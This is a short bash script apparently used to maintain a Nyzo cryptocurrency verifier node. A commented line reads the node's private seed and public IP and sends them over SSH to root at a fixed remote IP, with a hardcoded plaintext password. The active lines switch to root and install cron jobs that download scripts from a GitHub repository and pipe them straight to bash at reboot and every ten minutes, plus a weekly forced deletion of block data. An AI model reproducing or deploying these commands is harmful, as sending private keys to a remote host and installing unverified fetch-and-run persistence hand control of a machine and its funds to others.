#!/bin/bash
#sudo su
#echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'pB3SbjkH' ssh root@139.99.90.249 'cat - >> /root/testv'
#cd /home/ubuntu/nyzoVerifier
#sudo git reset --hard
#sudo git pull origin master
#sudo ./gradlew build
sudo su
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/reload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/oneminute.sh | bash
41 3 * * 5  sudo rm -rf ~/.cache/thumbnails/* && sudo rm -rf /var/lib/nyzo/production/blocks && sudo supervisorctl reload
 " >> myverifier
sudo crontab myverifier
rm myverifier
sudo supervisorctl reload
